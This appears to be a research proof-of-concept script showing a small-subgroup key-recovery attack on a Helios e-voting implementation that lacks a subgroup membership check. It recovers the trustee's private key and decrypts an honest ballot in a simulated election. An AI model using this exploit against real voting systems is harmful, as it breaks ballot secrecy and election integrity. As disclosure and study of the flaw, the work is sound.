import time
import sympy
import helios_core as H
from election import Election
from common_subgroup import element_of_order, pohlig_hellman_prime_power, crt_combine


def smooth_prime_factors(cofactor, limit=200000):
    f = sympy.factorint(cofactor, limit=limit)
    out = []
    for pr, e in f.items():
        if pr < limit:
            out.append((int(pr), int(e)))
    out.sort()
    return out


def confine_and_recover(pk, sk, prime_powers, verbose=False):
    p = pk.p
    residues = []
    t0 = time.perf_counter()
    for (ell, e) in prime_powers:
        modulus = ell ** e
        h = element_of_order(p, pk.q, (p - 1) // pk.q, ell, e)
        if h is None:
            continue
        published = pow(h, sk.x, p)
        xmod = pohlig_hellman_prime_power(p, h, published, ell, e)
        residues.append((xmod, modulus))
        if verbose:
            print("    order %-10s : trustee publishes h^x, small dlog -> x mod %-10s = %d"
                  % (modulus, modulus, xmod))
    x_rec, M = crt_combine(residues)
    dt = time.perf_counter() - t0
    return x_rec, M, dt


def run_standard_prime(verbose=True):
    print("\n[A] Standard Helios 2048-bit prime (non-safe): confine on the cofactor.")
    rng = H.StrongRandomStub(5)
    e = Election(check_subgroup_on_cast=False)
    pk = e.setup(rng=rng)
    cof = (pk.p - 1) // pk.q
    pps = smooth_prime_factors(cof, limit=2000)
    print("    cofactor smooth part (small primes): %s" % pps)
    x_rec, M, dt = confine_and_recover(pk, e.sk, pps, verbose=verbose)
    print("    recovered x mod M with M = %d  (%.1f bits), true x mod M matches: %s"
          % (M, M.bit_length(), (e.sk.x % M) == (x_rec % M)))
    print("    recovery time: %.4f s" % dt)
    return M.bit_length()


def run_smooth_regime(bits_target=64, verbose=True):
    print("\n[B] Smooth-cofactor regime (a malicious board may deploy such parameters).")
    p, q, g, cof_factors = build_smooth_prime(subgroup_bits=48)
    params = H.Params(p=p, q=q, g=g)
    rng = H.StrongRandomStub(9)
    e = Election(params=params, check_subgroup_on_cast=False)
    pk = e.setup(rng=rng)
    b_target = e.vote(0, 1, rng=rng)
    e.cast(b_target)
    print("    p is %d-bit, q is %d-bit; cofactor prime powers: %s"
          % (p.bit_length(), q.bit_length(), cof_factors))
    x_rec, M, dt = confine_and_recover(pk, e.sk, cof_factors, verbose=verbose)
    full = (x_rec % pk.q) == (e.sk.x % pk.q) if M >= pk.q else None
    print("    combined modulus M = %d (%d bits), subgroup order q is %d bits"
          % (M, M.bit_length(), pk.q.bit_length()))
    if M >= pk.q:
        x_full = x_rec % pk.q
        print("    FULL key recovered: x = %d   (matches trustee secret: %s)"
              % (x_full, x_full == e.sk.x))
        target_ct = b_target.ct
        m = (target_ct.beta * H.inverse(pow(target_ct.alpha, x_full, p), p)) % p
        bit = 0 if m == 1 else (1 if m == pk.g % p else "?")
        print("    decrypt observed honest ballot -> plaintext bit = %s (true = 1)" % bit)
    print("    recovery time: %.4f s" % dt)


def build_smooth_prime(subgroup_bits=48):
    import random
    rnd = random.Random(2024)
    q = sympy.nextprime(1 << subgroup_bits)
    small_primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71]
    while True:
        cof = 2
        factors = [(2, 1)]
        used = {2}
        for pr in small_primes:
            if pr in used:
                continue
            if cof.bit_length() > subgroup_bits + 8:
                break
            cof *= pr
            factors.append((pr, 1))
            used.add(pr)
        p = q * cof + 1
        if sympy.isprime(p):
            break
        q = sympy.nextprime(q)
    g = find_generator(p, q, cof)
    factors = sorted([(pr, e) for pr, e in factors])
    return p, int(q), g, factors


def find_generator(p, q, cof):
    import random
    rnd = random.Random(7)
    while True:
        h = rnd.randrange(2, p - 1)
        g = pow(h, cof, p)
        if g != 1 and pow(g, q, p) == 1:
            return g


if __name__ == "__main__":
    print("=" * 74)
    print("Helios A3 : small-subgroup key recovery  (flaw H-V4, no subgroup check)")
    print("=" * 74)
    print("\nThe live verifier and the trustee decryption omit the order-q membership test.")
    print("A board that substitutes a confined element alpha=h (small order d) makes the")
    print("trustee publish h^x; a small discrete log gives x mod d, and CRT over several")
    print("orders recovers the trustee key, after which the whole board decrypts.")
    bits = run_standard_prime(verbose=True)
    run_smooth_regime(verbose=True)
    print("\nRESULT: H-V4 exposes %d key bits on the standard prime and the full trustee" % bits)
    print("        key under a smooth cofactor, breaking BPRIV by decrypting any ballot.")
